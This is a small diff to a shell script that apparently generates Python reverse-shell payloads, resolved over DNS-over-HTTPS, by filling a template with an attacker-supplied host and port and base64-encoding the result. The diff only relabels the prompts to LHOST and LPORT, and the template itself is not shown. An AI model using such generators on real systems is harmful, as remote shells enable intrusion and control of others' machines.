@@ -2,8 +2,8 @@
 cat banner.txt
 echo "[i] Generate cmd/unix/reverse_python payloads with DNS over HTTPS resolution : "
 echo ""
-read -p "[*] HOST (example.org) >>> " host
-read -p "[*] PORT (1337)        >>> " port
+read -p "[*] LHOST >>> " host
+read -p "[*] LPORT >>> " port
 sed "s/REPL_HOST/$host/g" template.py > payload.py
 sed -i "s/REPL_PORT/$port/g" payload.py
 payload=$(cat payload.py | base64 -w0)
